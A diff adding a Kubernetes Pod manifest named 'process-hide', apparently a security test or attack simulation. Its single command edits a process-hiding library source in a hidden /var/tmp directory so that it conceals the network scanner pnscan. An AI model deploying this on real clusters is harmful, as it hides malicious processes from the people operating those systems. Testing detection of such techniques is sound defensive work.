@@ -1,0 +1,11 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: process-hide
+spec:
+  containers:
+  - name: process-hide
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ["sh"]
+    args: ['-c', 'sed -i s/evil_script.py/pnscan/g /var/tmp/.11/..lph/processhider.c']
